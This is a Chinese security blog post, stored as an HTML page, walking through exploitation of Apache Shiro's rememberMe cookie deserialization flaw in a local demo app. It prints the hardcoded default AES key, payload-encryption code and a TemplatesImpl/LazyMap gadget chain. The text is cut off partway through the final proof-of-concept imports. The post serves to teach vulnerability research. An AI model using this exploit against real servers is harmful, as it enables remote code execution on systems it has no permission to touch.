@@ -1,0 +1,431 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>java安全 Shiro反序列化利用CC链 - ThnPinkman’s blog</title><meta name="Description" content="只是向上走"><meta property="og:url" content="https://thnpkm.github.io/posts/java%E5%AE%89%E5%85%A8/java%E5%AE%89%E5%85%A8-shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8cc%E9%93%BE/">
+  <meta property="og:site_name" content="ThnPinkman’s blog">
+  <meta property="og:title" content="java安全 Shiro反序列化利用CC链">
+  <meta property="og:description" content="shiro Apache Shiro 是一个强大灵活的java开源安全框架，用于身份验证、授权和会话管理。
+为了让浏览器或服务器重启后用户不丢失登录状态，Shiro支持将持久化信息序列化并加密后保存在Cookie的rememberMe字段中，下次读取时进行解密再反序列化。
+环境搭建 创建个maven项目，用p神写的shirodemo https://github.com/phith0n/JavaThings踩坑：
+启动服务过程中报错配置应用程序监听器[org.apache.shiro.web.env.EnvironmentLoaderListener]错误
+maven项目容易报这种错, 一般就是依赖没有成功引入。这个错误查了一下大概就是shiro包没有
+注意maven引入需要的shiro包
+刚开始我这里pom.xml显示找不到依赖，要去设置setting.xml https://blog.csdn.net/qq_61649579/article/details/124494237然后刷新maven ，成功引入就好
+账号：root 密码：secret
+当我们登录时勾选：Remember me 时，登录成功后，服务端成功登录后会返回rememberMe的cookie
+Shiro反序列化 为了让浏览器或服务器重 启后用户不丢失登录状态，Shiro支持将持久化信息序列化并加密后保存在Cookie的rememberMe字 段中，下次读取时进行解密再反序列化。但是在Shiro 1.2.4版本之前内置了一个默认且固定的加密 Key，导致攻击者可以伪造任意的rememberMe Cookie，进而触发反序列化漏洞。
+在org.apache.shiro.mgt.AbstractRememberMeManager
+rememberMe的cookie值 –&gt; Base64解码 –&gt; AES解密 –&gt; 反序列化
+攻击过程 使用以前学过的CommonsCollections利用链生成一个序列化Payload
+使用Shiro默认Key进行加密
+将密文作为rememberMe的Cookie发送给服务端
+的shiro内置的类 org.apache.shiro.crypto.AesCipherService ，最后生成一段base64字符串。
+直接将这段字符串作为rememberMe的值（不做url编码），发送给shiro。结果并没有弹出计算器
+import org.apache.shiro.crypto.AesCipherService; import org.apache.shiro.util.ByteSource; public class Client0 { public static void main(String []args) throws Exception { byte[] payloads = new CommonsCollections6().getPayload(&#34;calc.exe&#34;); AesCipherService aes = new AesCipherService(); byte[] key = java.">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-08-20T22:54:43+08:00">
+    <meta property="article:modified_time" content="2024-08-20T22:54:43+08:00">
+    <meta property="article:tag" content="Java">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="java安全 Shiro反序列化利用CC链">
+  <meta name="twitter:description" content="shiro Apache Shiro 是一个强大灵活的java开源安全框架，用于身份验证、授权和会话管理。
+为了让浏览器或服务器重启后用户不丢失登录状态，Shiro支持将持久化信息序列化并加密后保存在Cookie的rememberMe字段中，下次读取时进行解密再反序列化。
+环境搭建 创建个maven项目，用p神写的shirodemo https://github.com/phith0n/JavaThings踩坑：
+启动服务过程中报错配置应用程序监听器[org.apache.shiro.web.env.EnvironmentLoaderListener]错误
+maven项目容易报这种错, 一般就是依赖没有成功引入。这个错误查了一下大概就是shiro包没有
+注意maven引入需要的shiro包
+刚开始我这里pom.xml显示找不到依赖，要去设置setting.xml https://blog.csdn.net/qq_61649579/article/details/124494237然后刷新maven ，成功引入就好
+账号：root 密码：secret
+当我们登录时勾选：Remember me 时，登录成功后，服务端成功登录后会返回rememberMe的cookie
+Shiro反序列化 为了让浏览器或服务器重 启后用户不丢失登录状态，Shiro支持将持久化信息序列化并加密后保存在Cookie的rememberMe字 段中，下次读取时进行解密再反序列化。但是在Shiro 1.2.4版本之前内置了一个默认且固定的加密 Key，导致攻击者可以伪造任意的rememberMe Cookie，进而触发反序列化漏洞。
+在org.apache.shiro.mgt.AbstractRememberMeManager
+rememberMe的cookie值 –&gt; Base64解码 –&gt; AES解密 –&gt; 反序列化
+攻击过程 使用以前学过的CommonsCollections利用链生成一个序列化Payload
+使用Shiro默认Key进行加密
+将密文作为rememberMe的Cookie发送给服务端
+的shiro内置的类 org.apache.shiro.crypto.AesCipherService ，最后生成一段base64字符串。
+直接将这段字符串作为rememberMe的值（不做url编码），发送给shiro。结果并没有弹出计算器
+import org.apache.shiro.crypto.AesCipherService; import org.apache.shiro.util.ByteSource; public class Client0 { public static void main(String []args) throws Exception { byte[] payloads = new CommonsCollections6().getPayload(&#34;calc.exe&#34;); AesCipherService aes = new AesCipherService(); byte[] key = java.">
+<meta name="application-name" content="ThnPinkman&#39;s blog">
+<meta name="apple-mobile-web-app-title" content="ThnPinkman&#39;s blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://thnpkm.github.io/posts/java%E5%AE%89%E5%85%A8/java%E5%AE%89%E5%85%A8-shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8cc%E9%93%BE/" /><link rel="prev" href="https://thnpkm.github.io/posts/java%E5%AE%89%E5%85%A8/java%E5%AE%89%E5%85%A8-cc3%E9%93%BE/" /><link rel="next" href="https://thnpkm.github.io/posts/java%E5%AE%89%E5%85%A8/java%E5%AE%89%E5%85%A8-cc2%E9%93%BE/" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "java安全 Shiro反序列化利用CC链",
+        "inLanguage": "en-us",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/thnpkm.github.io\/posts\/java%E5%AE%89%E5%85%A8\/java%E5%AE%89%E5%85%A8-shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8cc%E9%93%BE\/"
+        },"genre": "posts","keywords": "java","wordcount":  432 ,
+        "url": "https:\/\/thnpkm.github.io\/posts\/java%E5%AE%89%E5%85%A8\/java%E5%AE%89%E5%85%A8-shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8cc%E9%93%BE\/","datePublished": "2024-08-20T22:54:43+08:00","dateModified": "2024-08-20T22:54:43+08:00","publisher": {
+            "@type": "Organization",
+            "name": "","logo": "https:\/\/thnpkm.github.io\/1651835469576.jpg"},"author": {
+                "@type": "Person",
+                "name": "Author"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="ThnPinkman’s blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.github.io/1651835469576.jpg"
+        data-srcset="https://thnpkm.github.io/1651835469576.jpg, https://thnpkm.github.io/1651835469576.jpg 1.5x, https://thnpkm.github.io/1651835469576.jpg 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.github.io/1651835469576.jpg"
+        title="https://thnpkm.github.io/1651835469576.jpg" />ThnPinkman&#39;s blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/about/"> About </a><a class="menu-item" href="/categories/"> Categories </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="ThnPinkman’s blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.github.io/1651835469576.jpg"
+        data-srcset="https://thnpkm.github.io/1651835469576.jpg, https://thnpkm.github.io/1651835469576.jpg 1.5x, https://thnpkm.github.io/1651835469576.jpg 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.github.io/1651835469576.jpg"
+        title="https://thnpkm.github.io/1651835469576.jpg" />ThnPinkman&#39;s blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/about/" title="">About</a><a class="menu-item" href="/categories/" title="">Categories</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">java安全 Shiro反序列化利用CC链</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a>
+</span>&nbsp;<span class="post-category">included in <a href="/categories/java%E5%AE%89%E5%85%A8/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Java安全</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2024-08-20">2024-08-20</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;432 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;3 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#shiro">shiro</a>
+      <ul>
+        <li><a href="#环境搭建">环境搭建</a></li>
+      </ul>
+    </li>
+    <li><a href="#shiro反序列化">Shiro反序列化</a>
+      <ul>
+        <li><a href="#攻击过程">攻击过程</a></li>
+        <li><a href="#构造不含数组的gadgets">构造不含数组的GadGets</a></li>
+        <li><a href="#poc">POC</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h2 id="shiro">shiro</h2>
+<p>Apache Shiro 是一个强大灵活的java开源安全框架，用于身份验证、授权和会话管理。</p>
+<p>为了让浏览器或服务器重启后用户不丢失登录状态，Shiro支持将持久化信息<strong>序列化</strong>并<strong>加密</strong>后保存在Cookie的<code>rememberMe</code>字段中，下次读取时进行<code>解密</code>再<code>反序列化</code>。</p>
+<h3 id="环境搭建">环境搭建</h3>
+<p>创建个maven项目，用p神写的shirodemo <a href="https://github.com/phith0n/JavaThings" target="_blank" rel="noopener noreffer">https://github.com/phith0n/JavaThings</a>
+</p>
+<!-- raw HTML omitted -->
+<p>踩坑：</p>
+<p>启动服务过程中报错<code>配置应用程序监听器[org.apache.shiro.web.env.EnvironmentLoaderListener]错误</code></p>
+<p>maven项目容易报这种错, 一般就是依赖没有成功引入。这个错误查了一下大概就是shiro包没有</p>
+<p>注意maven引入需要的shiro包</p>
+<!-- raw HTML omitted -->
+<p>刚开始我这里pom.xml显示找不到依赖，要去设置setting.xml  <a href="https://blog.csdn.net/qq_61649579/article/details/124494237" target="_blank" rel="noopener noreffer">https://blog.csdn.net/qq_61649579/article/details/124494237</a>
+</p>
+<p>然后刷新maven ，成功引入就好</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202308052246250.png"
+        data-srcset="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202308052246250.png, https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202308052246250.png 1.5x, https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202308052246250.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202308052246250.png"
+        title="image-20230805224656217" /></p>
+<p>账号：<code>root</code> 密码：<code>secret</code></p>
+<p>当我们登录时勾选：<code>Remember me</code> 时，登录成功后，服务端成功登录后会返回<code>rememberMe</code>的cookie</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202308061704533.png"
+        data-srcset="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202308061704533.png, https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202308061704533.png 1.5x, https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202308061704533.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202308061704533.png"
+        title="image-20230806170432403" /></p>
+<h2 id="shiro反序列化">Shiro反序列化</h2>
+<p>为了让浏览器或服务器重 启后用户不丢失登录状态，Shiro支持将持久化信息序列化并加密后保存在Cookie的rememberMe字 段中，下次读取时进行解密再反序列化。但是在Shiro 1.2.4版本之前内置了一个<strong>默认且固定的加密 Key</strong>，导致攻击者可以伪造任意的rememberMe Cookie，进而触发反序列化漏洞。</p>
+<p>在<code>org.apache.shiro.mgt.AbstractRememberMeManager</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202308062031104.png"
+        data-srcset="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202308062031104.png, https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202308062031104.png 1.5x, https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202308062031104.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202308062031104.png"
+        title="image-20230806203114069" /></p>
+<p>rememberMe的cookie值 –&gt; Base64解码 –&gt; AES解密 –&gt; 反序列化</p>
+<h3 id="攻击过程">攻击过程</h3>
+<ol>
+<li>
+<p>使用以前学过的CommonsCollections利用链生成一个序列化Payload</p>
+</li>
+<li>
+<p>使用Shiro默认Key进行加密</p>
+</li>
+<li>
+<p>将密文作为rememberMe的Cookie发送给服务端</p>
+</li>
+</ol>
+<p>的shiro内置的类 org.apache.shiro.crypto.AesCipherService ，最后生成一段base64字符串。</p>
+<p>直接将这段字符串作为rememberMe的值（不做url编码），发送给shiro。结果并没有弹出计算器</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.shiro.crypto.AesCipherService;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.shiro.util.ByteSource;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Client0</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(String <span style="color:#f92672">[]</span>args) <span style="color:#66d9ef">throws</span> Exception {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> payloads <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> CommonsCollections6().<span style="color:#a6e22e">getPayload</span>(<span style="color:#e6db74">&#34;calc.exe&#34;</span>);
+</span></span><span style="display:flex;"><span>        AesCipherService aes <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> AesCipherService();
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> key <span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span>                java.<span style="color:#a6e22e">util</span>.<span style="color:#a6e22e">Base64</span>.<span style="color:#a6e22e">getDecoder</span>().<span style="color:#a6e22e">decode</span>(<span style="color:#e6db74">&#34;kPH+bIxk5D2deZiIxcaaaA==&#34;</span>);
+</span></span><span style="display:flex;"><span>        ByteSource ciphertext <span style="color:#f92672">=</span> aes.<span style="color:#a6e22e">encrypt</span>(payloads, key);
+</span></span><span style="display:flex;"><span>        System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">printf</span>(ciphertext.<span style="color:#a6e22e">toString</span>());
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>具体原因是因为不能加载<code>Transformer[]</code>，总的来说就是：如果shiro反序列化流中包含<strong>非Java自身的数组</strong>，则会出现无法加载类的错误。这就 解释了为什么CommonsCollections6无法利用了，因为其中用到了Transformer数组。</p>
+<p>那么我们如何构造才能避免使用Transformer数组呢，这就用到了前面学的TemplatesImpl</p>
+<h3 id="构造不含数组的gadgets">构造不含数组的GadGets</h3>
+<p>上一篇文章我们介绍CC3的时候，用到了TemplatesImpl和InvokerTransformer，但是还是需要用到Transformer数组的</p>
+<p>使用了<code>TemplatesImpl</code>执行java字节码需调用<code>TemplatesImpl#newTransformer()</code>方法</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>Transformer<span style="color:#f92672">[]</span> transformers <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Transformer<span style="color:#f92672">[]</span>{ 
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">new</span> ConstantTransformer(obj), 
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">new</span> InvokerTransformer(<span style="color:#e6db74">&#34;newTransformer&#34;</span>, <span style="color:#66d9ef">null</span>, <span style="color:#66d9ef">null</span>)
+</span></span><span style="display:flex;"><span>};
+</span></span></code></pre></div><p><code>ConstantTransformer#transform()</code>的作用就是将<code>obj</code>给返回</p>
+<p>这里还是用到了数组，怎么办？我们可以结合cc6中的相关操作</p>
+<p>因为使用到了<code>LazyMap</code>这个类的<code>get()</code>方法就可以触发链子</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> Map <span style="color:#a6e22e">decorate</span>(Map map, Transformer factory) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">new</span> LazyMap(map, factory);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> Object <span style="color:#a6e22e">get</span>(Object key) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">map</span>.<span style="color:#a6e22e">containsKey</span>(key)) {
+</span></span><span style="display:flex;"><span>            Object value <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">factory</span>.<span style="color:#a6e22e">transform</span>(key);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">map</span>.<span style="color:#a6e22e">put</span>(key, value);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> value;
+</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">map</span>.<span style="color:#a6e22e">get</span>(key);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span></code></pre></div><p>观察一下这个<code>get()</code>方法参数<code>Object key</code></p>
+<p>由于我们<code>LazyMap</code>是这么构造的：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>Map outerMap <span style="color:#f92672">=</span> LazyMap.<span style="color:#a6e22e">decorate</span>(innerMap, transformerChain);
+</span></span></code></pre></div><p>所以<code>factory</code>就是<code>transformerChain</code> ，如果我们能控制这个<code>key</code>的话，就可以触发<code>ChainedTransform#transform()</code>方法，进而调用<code>InvokerTransformer#transform()</code>方法</p>
+<p>调用<code>TemplatesImpl#newTransformer()</code>方法将<code>key</code>传给<code>InvokerTransformer#transform()</code>方法，如果这个<code>key</code>刚好是<code>TemplatesImpl</code>对象的话，就可以触发方法。这样我们发现，<code>ConstantTransformer</code>可以从<code>Transformer</code>数组中给去掉了</p>
+<p>我们怎么控制<code>key</code>？</p>
+<p>在cc6中使用了<code>TiedMapEntry</code>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JAVA" data-lang="JAVA"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#a6e22e">TiedMapEntry</span>(Map map, Object key) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">map</span> <span style="color:#f92672">=</span> map;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">key</span> <span style="color:#f92672">=</span> key;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> Object <span style="color:#a6e22e">getValue</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">map</span>.<span style="color:#a6e22e">get</span>(<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">key</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p><code>getValue()</code>会调用<code>map</code>的get方法，如果<code>map</code>是<code>LazyMap</code>而<code>key</code>是<code>TemplatesImpl</code>对象就刚好能满足条件了</p>
+<p>这个效果就和<code>ConstantTransformer</code>一样的，作为一个恶意对象传递的功能，所以我们只需要把恶意对象传入作为key就可以了</p>
+<p>此时<code>Transformer</code>数组只有<code>InvokerTransformer</code>这个类对象了，所以也就不需要数组了</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JAVA" data-lang="JAVA"><span style="display:flex;"><span>Transformer transformer <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> InvokerTransformer(<span style="color:#e6db74">&#34;getClass&#34;</span>, <span style="color:#66d9ef">null</span>, <span style="color:#66d9ef">null</span>);
+</span></span><span style="display:flex;"><span><span style="color:#75715e">//此处传入getClass()方法是为了不被后面的HashMap添加元素导致的链式反应影响</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JAVA" data-lang="JAVA"><span style="display:flex;"><span>TiedMapEntry<span style="color:#960050;background-color:#1e0010">#</span>hashCode()
+</span></span><span style="display:flex;"><span>    TiedMapEntry<span style="color:#960050;background-color:#1e0010">#</span>getValue()
+</span></span><span style="display:flex;"><span>        LazyMap<span style="color:#960050;background-color:#1e0010">#</span>get()
+</span></span><span style="display:flex;"><span>            ChainedTransformer<span style="color:#960050;background-color:#1e0010">#</span>transform()
+</span></span><span style="display:flex;"><span>                InvokerTransformer<span style="color:#960050;background-color:#1e0010">#</span>transform(templates)
+</span></span><span style="display:flex;"><span>                    TemplatesImpl<span style="color:#960050;background-color:#1e0010">#</span>newTransform()
+</span></span></code></pre></div><h3 id="poc">POC</h3>
+<p>首先是参考前面的CC3利用TemplatesImpl去加载出一个恶意对象</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JAVA" data-lang="JAVA"><span style="display:flex;"><span>TemplatesImpl obj <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> TemplatesImpl();
+</span></span><span style="display:flex;"><span>setFieldValue(obj, <span style="color:#e6db74">&#34;_bytecodes&#34;</span>, <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">byte</span><span style="color:#f92672">[][]</span>{clazzBytes});
+</span></span><span style="display:flex;"><span>setFieldValue(obj, <span style="color:#e6db74">&#34;_name&#34;</span>, <span style="color:#e6db74">&#34;HelloTemplatesImpl&#34;</span>);
+</span></span><span style="display:flex;"><span>setFieldValue(obj, <span style="color:#e6db74">&#34;_tfactory&#34;</span>, <span style="color:#66d9ef">new</span> TransformerFactoryImpl());
+</span></span></code></pre></div><p>然后这里依然是用CC6的来接，构造faketransformer来防止构造时触发链子，但是和CC6的不一样，不能用ChainedTransformer了，所以得手动构造个无害transformer对象</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JAVA" data-lang="JAVA"><span style="display:flex;"><span>Transformer fakeTransformer <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ConstantTransformer(1);
+</span></span></code></pre></div><p>加上CC6的链子</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JAVA" data-lang="JAVA"><span style="display:flex;"><span><span style="color:#f92672">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> javassist.ClassPool;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> javassist.CtClass;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections.Transformer;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections.functors.InvokerTransformer;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections.map.LazyMap;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.shiro.crypto.AesCipherService;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.shiro.util.ByteSource;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.ByteArrayOutputStream;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.ObjectOutputStream;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.lang.reflect.Field;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.util.Base64;
